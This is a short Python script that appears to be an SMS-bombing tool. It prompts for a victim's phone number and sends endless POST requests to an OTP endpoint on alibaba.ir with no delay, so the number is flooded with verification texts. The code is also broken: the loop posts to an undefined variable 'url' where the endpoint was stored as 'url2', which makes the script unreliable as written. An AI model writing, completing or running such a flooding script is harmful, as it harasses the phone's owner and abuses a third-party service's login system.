import requests
from termcolor import colored
import time

phonen = input('phone number: ')
url2 = 'https://ws.alibaba.ir/api/v3/account/mobile/otp'

pnd = {'cellphon': f'{phonen}'}

while True:
      req2 = requests.post(url, json=pnd)
      
      print(colored('yes', 'red'))
